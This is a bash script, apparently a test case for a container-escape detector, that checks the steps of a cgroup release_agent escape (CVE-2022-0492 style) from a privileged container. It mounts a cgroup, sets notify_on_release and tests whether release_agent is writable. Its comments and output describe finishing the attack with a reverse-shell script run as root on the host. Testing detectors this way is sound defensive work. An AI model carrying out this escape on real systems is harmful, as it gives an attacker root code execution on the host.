#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# ATTACK 3 — Cgroup Release Agent Escape (CVE-2022-0492 style)
#
# Technique:  From a privileged container, abuse the cgroup
#             release_agent mechanism to execute arbitrary commands
#             ON THE HOST. This is based on the real CVE-2022-0492.
#
# How it works:
#   1. Mount a cgroup controller (e.g., memory)
#   2. Create a child cgroup
#   3. Set notify_on_release = 1
#   4. Set release_agent to a script path (on the host)
#   5. Trigger the release agent by making the cgroup empty
#   → The host kernel executes the release_agent script AS ROOT
#
# What the detector should catch:
#   - mount(cgroup)    → privileged-container-escape  CRITICAL
#   - openat(/sys/...) → sensitive-host-path-open     HIGH
#   - openat(/proc/..) → sensitive-host-path-open     HIGH
#
# NOTE: This attack is performed READ-ONLY — we do NOT actually
# write a malicious release_agent. We demonstrate the escape path
# is open by verifying each prerequisite step succeeds.
# ──────────────────────────────────────────────────────────────────
set -e

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  REAL ATTACK 3 — Cgroup Release Agent Escape            ║"
echo "║  CVE-2022-0492 style (running inside --privileged)       ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${CYAN}[INFO]${RESET} PID: $$  UID: $(id -u)  Hostname: $(hostname)"
echo ""

CGROUP_MNT="/tmp/cgroup_escape"
CGROUP_CHILD="${CGROUP_MNT}/escape_test"
ESCAPE_POSSIBLE=true

# ── Step 1: Mount a cgroup v1 controller ──────────────────────────
echo -e "${YELLOW}[STEP 1]${RESET} Mounting cgroup memory controller..."
mkdir -p "$CGROUP_MNT"
if mount -t cgroup -o memory cgroup "$CGROUP_MNT" 2>/dev/null; then
    echo -e "${GREEN}[SUCCESS]${RESET} Mounted cgroup memory controller at $CGROUP_MNT"
else
    echo -e "${RED}[BLOCKED]${RESET} Cannot mount cgroup — may be cgroupv2 only or unprivileged"
    ESCAPE_POSSIBLE=false
fi
echo ""

# ── Step 2: Create a child cgroup ─────────────────────────────────
echo -e "${YELLOW}[STEP 2]${RESET} Creating child cgroup..."
if $ESCAPE_POSSIBLE; then
    if mkdir -p "$CGROUP_CHILD" 2>/dev/null; then
        echo -e "${GREEN}[SUCCESS]${RESET} Created child cgroup: $CGROUP_CHILD"
    else
        echo -e "${RED}[BLOCKED]${RESET} Cannot create child cgroup"
        ESCAPE_POSSIBLE=false
    fi
fi
echo ""

# ── Step 3: Check notify_on_release ───────────────────────────────
echo -e "${YELLOW}[STEP 3]${RESET} Checking notify_on_release capability..."
if $ESCAPE_POSSIBLE && [ -f "$CGROUP_CHILD/notify_on_release" ]; then
    CURRENT=$(cat "$CGROUP_CHILD/notify_on_release" 2>/dev/null)
    echo -e "  Current notify_on_release: $CURRENT"

    # Enable notify_on_release (this is the key step)
    if echo 1 > "$CGROUP_CHILD/notify_on_release" 2>/dev/null; then
        echo -e "${GREEN}[SUCCESS]${RESET} Set notify_on_release = 1"
    else
        echo -e "${RED}[BLOCKED]${RESET} Cannot write notify_on_release"
        ESCAPE_POSSIBLE=false
    fi
else
    echo -e "${RED}[BLOCKED]${RESET} notify_on_release file not found"
    ESCAPE_POSSIBLE=false
fi
echo ""

# ── Step 4: Check release_agent writability ───────────────────────
echo -e "${YELLOW}[STEP 4]${RESET} Checking release_agent writability..."
if $ESCAPE_POSSIBLE && [ -f "$CGROUP_MNT/release_agent" ]; then
    CURRENT_AGENT=$(cat "$CGROUP_MNT/release_agent" 2>/dev/null)
    echo -e "  Current release_agent: '${CURRENT_AGENT}'"

    # Find our path on the host filesystem
    HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/self/mountinfo 2>/dev/null | head -1)
    echo -e "  Container overlay path: ${HOST_PATH:-unknown}"

    # In a real attack, we would write:
    #   echo "/path/on/host/to/payload.sh" > release_agent
    # But we only TEST writability without deploying a payload
    if [ -w "$CGROUP_MNT/release_agent" ]; then
        echo -e "${RED}[VULN]${RESET} release_agent IS WRITABLE — full host code execution possible!"
    else
        echo -e "${GREEN}[SAFE]${RESET} release_agent is not writable"
        ESCAPE_POSSIBLE=false
    fi
else
    echo -e "${RED}[BLOCKED]${RESET} release_agent file not found"
    ESCAPE_POSSIBLE=false
fi
echo ""

# ── Step 5: Verify the escape path ────────────────────────────────
echo -e "${YELLOW}[STEP 5]${RESET} Escape path summary:"
if $ESCAPE_POSSIBLE; then
    echo -e "${RED}  [!] ALL PREREQUISITES MET — cgroup release_agent escape is POSSIBLE${RESET}"
    echo -e "  In a real attack, an attacker would:"
    echo -e "  1. Write a reverse-shell script to the container filesystem"
    echo -e "  2. Set release_agent = /path/on/host/to/script.sh"
    echo -e "  3. Trigger cgroup release by moving PID out of child cgroup"
    echo -e "  4. Host kernel executes the script AS ROOT"
else
    echo -e "${GREEN}  [✓] Escape path is BLOCKED at one or more steps${RESET}"
fi
echo ""

# ── Cleanup ───────────────────────────────────────────────────────
echo -e "${CYAN}[CLEANUP]${RESET} Removing test cgroup..."
rmdir "$CGROUP_CHILD" 2>/dev/null || true
umount "$CGROUP_MNT" 2>/dev/null || true
rmdir "$CGROUP_MNT" 2>/dev/null || true

echo ""
echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  CONCLUSION: Cgroup release_agent escape tested          ║"
echo "║  The detector should have fired CRITICAL alerts for:     ║"
echo "║    - mount(cgroup) syscall                               ║"
echo "║    - sensitive path access (/sys/fs/cgroup, /proc/self)  ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${RESET}"
